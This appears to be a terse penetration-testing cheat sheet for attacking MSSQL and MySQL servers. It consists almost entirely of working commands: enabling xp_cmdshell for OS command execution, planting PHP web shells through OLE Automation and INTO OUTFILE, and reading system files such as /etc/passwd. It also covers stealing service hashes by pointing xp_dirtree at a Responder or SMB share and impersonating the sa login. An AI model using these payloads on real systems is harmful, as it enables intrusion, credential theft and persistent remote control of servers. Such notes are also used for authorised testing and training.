### MSSQL
###### Connecting
```
#Linux
sqsh -S <IP> -U <USER> -P <PASS> 
impacket-mssqlclient -p 1433 <USER>@<IP> 
impacket-mssqlclient -p 1433 <USER>@<IP> -windows-auth

#Windows
sqlcmd -S <IP> -U <USER> -P <PASS>
```
###### xp_cmdshell
```
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE
xp_cmdshell 'whoami'
```
###### Write local file
```
sp_configure 'show advanced options', 1
sp_configure 'Ole Automation Procedures', 1
RECONFIGURE
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```
###### Read local file
```
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```
###### Service hash stealing 
```
sudo responder -I tun0
sudo impacket-smbserver share ./ -smb2support
EXEC master..xp_dirtree '\\<IP>\<SHARE>\' 
EXEC master..xp_subdirs '\\<IP>\<SHARE>\'
```
###### User Impersonation
```
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```
### MySQL
###### Connecting
```
mysql -u <USER> -p<PASS> -h <IP> --skip-ssl
```
###### Write local file
```
show variables like "secure_file_priv"; #check if we can write
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```
###### Read local file
```
select LOAD_FILE("/etc/passwd");
```